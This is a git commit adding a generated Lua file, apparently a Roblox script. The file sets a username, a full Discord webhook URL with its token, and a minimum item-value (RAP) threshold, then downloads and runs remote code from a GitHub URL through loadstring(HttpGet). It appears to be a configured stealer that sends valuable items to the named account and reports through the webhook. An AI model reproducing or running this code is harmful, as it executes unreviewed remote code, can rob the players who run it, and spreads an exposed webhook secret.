dbfbe991422593ab31ebf4f5c64b43d6f1f81da4
VOIDZ <goldbed145@gmail.com>
2024-12-12 10:37:31 +0800

    Add generated file: VoidScript_730105_combined.lua

---
+++ lua/VoidScript_730105_combined.lua
@@ -0,0 +1,8 @@
+-- User Information
+Username = 'mainarxd123'
+Webhook = 'https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI'
+
+-- Script Code
+MinimumRAP = 500000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/VOIDv3/VOIDSCRIPTS/refs/heads/main/VOIDSCRIPTS'))()
